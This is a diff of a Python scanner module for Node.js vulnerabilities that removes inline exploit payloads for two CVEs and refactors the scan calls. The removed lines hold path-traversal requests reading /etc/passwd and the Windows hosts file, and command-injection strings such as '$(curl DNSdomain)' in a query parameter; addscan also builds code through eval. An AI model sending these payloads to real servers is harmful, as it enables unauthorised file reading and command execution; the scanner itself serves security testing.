@@ -16,75 +16,22 @@ file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+# from lib.initial.config import config
 from lib.tool.thread import thread
 from payloads.Nodejs.cve_2017_14849 import cve_2017_14849_scan
 from payloads.Nodejs.cve_2021_21315 import cve_2021_21315_scan
 
 class Nodejs():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'Node.js'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.cve_2017_14849_payloads = [
-            {
-                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
-                'data': ''
-            },
-            {
-                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\\Windows\\System32\\drivers\\etc\\hosts',
-                'data': ''
-            }
-        ]
-        
-        self.cve_2021_21315_payloads = [
-            {
-                'path': 'api/getServices?name[]=$(curl DNSdomain)',
-                'data': ''
-            },
-            {
-                'path': 'api/getServices?name[]=$(ping -c 4 DNSdomain)',
-                'data': ''
-            },
-            {
-                'path': 'api/getServices?name[]=$(ping DNSdomain)',
-                'data': ''
-            },
-            {
-                'path': 'getServices?name[]=$(curl DNSdomain)',
-                'data': ''
-            },
-            {
-                'path': 'getServices?name[]=$(ping -c 4 DNSdomain)',
-                'data': ''
-            },
-            {
-                'path': 'getServices?name[]=$(ping DNSdomain)',
-                'data': ''
-            }
-        ]
-    
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2017_14849_scan, url=url),
-            thread(target=self.cve_2021_21315_scan, url=url)
+            thread(target=self.cve_2017_14849_scan, clients=clients),
+            thread(target=self.cve_2021_21315_scan, clients=clients)
         ]
 
 Nodejs.cve_2017_14849_scan = cve_2017_14849_scan
